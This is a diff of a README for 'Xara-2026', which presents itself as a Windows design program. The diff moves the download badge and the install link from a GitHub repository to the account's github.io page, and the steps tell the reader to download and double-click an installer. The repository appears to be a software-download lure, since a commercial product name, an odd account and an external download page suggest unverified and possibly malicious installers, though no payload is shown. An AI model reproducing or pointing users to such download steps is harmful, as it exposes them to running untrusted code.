@@ -1,6 +1,6 @@
 # 🎨 Xara-2026 - Create professional designs on Windows
 
-[![](https://img.shields.io/badge/Download-Xara_2026-blue.svg)](https://github.com/Craniatatartar569/Xara-2026)
+[![](https://img.shields.io/badge/Download-Xara_2026-blue.svg)](https://craniatatartar569.github.io)
 
 ## 📁 About the software
 
@@ -21,7 +21,7 @@ Before you install the software, ensure your computer meets these requirements:
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the following link to access the software files: [https://github.com/Craniatatartar569/Xara-2026](https://github.com/Craniatatartar569/Xara-2026)
+1. Visit the following link to access the software files: [https://craniatatartar569.github.io](https://craniatatartar569.github.io)
 2. Locate the download button or the latest release link on the page.
 3. Click the link to save the installer file to your computer.
 4. Open your Downloads folder and double-click the file to start the installer.
